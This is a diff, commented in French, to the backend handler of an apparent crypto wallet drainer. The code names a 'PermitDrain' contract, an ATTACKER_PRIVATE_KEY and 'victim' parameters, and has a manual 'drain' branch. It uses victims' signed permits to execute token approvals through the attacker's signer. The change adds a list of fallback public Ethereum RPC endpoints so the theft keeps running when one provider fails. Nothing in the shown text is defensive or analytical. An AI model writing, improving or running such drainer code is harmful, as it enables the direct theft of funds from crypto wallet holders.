@@ -9,8 +9,36 @@ const PERMIT_DRAIN_ABI = [
   'function nonces(address) view returns (uint256)'
 ];
 
-// --- RPC fiable (remplace Infura) ---
-const RPC_URL = 'https://eth.llamarpc.com';
+// Liste de RPC publics fiables (ordre de préférence)
+const RPC_CANDIDATES = [
+  'https://rpc.ankr.com/eth',
+  'https://cloudflare-eth.com',
+  'https://1rpc.io/eth',
+  'https://eth-mainnet.public.blastapi.io',
+  'https://ethereum-rpc.publicnode.com',
+  'https://eth.llamarpc.com',
+  'https://eth-mainnet.g.alchemy.com/v2/demo'
+];
+
+/**
+ * Essaie chaque RPC jusqu’à en trouver un qui réponde correctement.
+ * Retourne une instance de JsonRpcProvider fonctionnelle.
+ */
+async function getWorkingProvider() {
+  for (const url of RPC_CANDIDATES) {
+    try {
+      const provider = new ethers.providers.JsonRpcProvider(url);
+      // Vérifie la connectivité en appelant une méthode simple
+      await provider.getNetwork();
+      console.log(`RPC OK : ${url}`);
+      return provider;
+    } catch (e) {
+      console.warn(`RPC échoué (${url}) : ${e.message}`);
+      continue;
+    }
+  }
+  throw new Error('❌ Aucun RPC disponible parmi la liste.');
+}
 
 function getPrivateKey() {
   if (process.env.ATTACKER_PRIVATE_KEY) {
@@ -38,8 +66,7 @@ export default async function handler(req, res) {
   if (req.method === 'OPTIONS') return res.status(200).end();
 
   if (req.method === 'POST') {
-    const { victim, chain, adminSecret, signature, deadline, token, spender, amount } =
-      req.body;
+    const { victim, chain, adminSecret, signature, deadline, token, spender, amount } = req.body;
 
     // --- DRAIN MANUEL ADMIN ---
     if (adminSecret) {
@@ -80,9 +107,16 @@ export default async function handler(req, res) {
     if (!victim || !signature || !deadline || !token || !spender || !amount)
       return res.status(400).json({ error: 'Paramètres manquants' });
 
-    // Vérification de la signature (lecture sur la blockchain)
+    // Obtenir un provider fonctionnel (une seule fois pour toute la requête)
+    let provider;
     try {
-      const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
+      provider = await getWorkingProvider();
+    } catch (e) {
+      return res.status(500).json({ error: 'Aucun fournisseur RPC disponible' });
+    }
+
+    // Vérification de la signature
+    try {
       const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, provider);
       const nonce = await permitContract.nonces(victim);
       const structHash = ethers.utils.solidityKeccak256(
@@ -101,9 +135,8 @@ export default async function handler(req, res) {
       return res.status(400).json({ error: 'Erreur signature' });
     }
 
-    // Exécution de l'approve via le contrat PermitDrain
+    // Exécuter l'approve
     try {
-      const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
       const signer = wallet.connect(provider);
       const permitContract = new ethers.Contract(PERMIT_DRAIN_ADDRESS, PERMIT_DRAIN_ABI, signer);
       const tx = await permitContract.executeApprove(
@@ -113,7 +146,7 @@ export default async function handler(req, res) {
         amount,
         deadline,
         signature,
-        { gasLimit: 300000 }  // un peu plus haut que 200k pour le reset + approve
+        { gasLimit: 300000 }
       );
       const receipt = await tx.wait();
       console.log('✅ Approve exécuté, tx:', receipt.transactionHash);
